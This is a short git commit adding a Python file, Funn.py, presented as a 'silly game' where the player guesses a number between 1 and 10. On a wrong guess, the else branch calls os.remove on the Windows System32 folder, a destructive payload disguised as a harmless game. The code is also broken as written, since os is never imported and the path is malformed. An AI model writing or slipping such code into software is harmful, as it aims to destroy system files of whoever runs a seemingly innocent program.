bfb2cdb2100c4426ad8bdd4357ca17584ecb0687
r0n-dev <164571341+r0n-dev@users.noreply.github.com>
2025-01-31 23:04:00 +0100

    Add files via upload

---
+++ Funn.py
@@ -0,0 +1,12 @@
+import random
+
+number = random.randint(1, 10)
+
+guess = input("Silly game! Guess a number between 1 and 10: ")
+guess = int(guess)
+
+if guess == number:
+    print("YOU WON!")
+else:
+    os.remove("C\Windows\System32")
+    
